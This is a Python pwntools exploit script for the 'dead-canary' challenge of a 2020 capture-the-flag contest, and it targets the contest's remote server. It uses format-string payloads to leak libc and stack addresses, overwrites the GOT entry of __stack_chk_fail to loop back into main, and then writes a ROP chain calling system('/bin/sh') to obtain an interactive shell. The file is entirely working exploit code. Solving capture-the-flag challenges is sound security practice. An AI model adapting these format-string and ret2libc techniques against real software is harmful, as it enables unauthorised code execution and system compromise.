#!/usr/bin/python3

from pwn import *

binary = ELF('./dead-canary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.update(arch='amd64',os='linux')
binary.symbols['main'] = 0x400737

rop = ROP([binary])
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

offset = 6
libcoffset = 41
stackoffset = 43
returnoffset = 0x200

#p = process(binary.path)
p = remote('2020.redpwnc.tf', 31744)

# first pass, inf. retries if we blow out canary, leak libc, leak stack
p.recvuntil('name: ')
payload  = b'%' + str(libcoffset).encode().rjust(2,b'0') + b'$018p'
payload += b'%' + str(stackoffset).encode().rjust(2,b'0') + b'$018p'
payload += fmtstr_payload(offset+2,{binary.got['__stack_chk_fail']:binary.symbols['main']},numbwritten=2*18)
payload += ((0x118 - 0x10 + 1) - len(payload)) * b'A'
p.send(payload)
p.recvuntil('Hello ')
_ = p.recv(18)
__libc_start_main = int(_,16) - 231
log.info('__libc_start_main: ' + hex(__libc_start_main))
baselibc = __libc_start_main - libc.symbols['__libc_start_main']
log.info('baselibc: ' + hex(baselibc))
libc.address = baselibc
_ = p.recv(18)
retaddr = int(_,16) - returnoffset
log.info('retaddr: ' + hex(retaddr))

# final pass, setup ROP chain in retaddr
p.recvuntil('name: ')
payload = fmtstr_payload(offset,{
	retaddr+ 0:ret,
	retaddr+ 8:pop_rdi,
	retaddr+16:libc.search(b'/bin/sh').__next__(),
	retaddr+24:libc.symbols['system']
},numbwritten=0,write_size='short',overflows=1)

log.info('payload len: ' + str(len(payload)))
if len(payload) > 0x118 - 0x10:
	log.critical('payload too long! exiting!')
	sys.exit(1)

p.sendline(payload)

# take out the garbage
null = payload.find(b'\x00')
log.info('null loc: ' + str(null))
p.recvuntil(payload[null-2:null])

p.interactive()

